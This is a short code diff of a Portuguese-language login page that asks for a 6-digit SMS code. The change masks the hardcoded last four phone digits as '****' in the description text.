@@ -196,7 +196,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         <span class="session-start-label">INÍCIO DE SESSÃO</span>
         <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
-        <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em 3819.</p>
+        <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>
 
         <form id="sms-form" onsubmit="handleFormSubmit(event)">
             <div class="code-inputs">
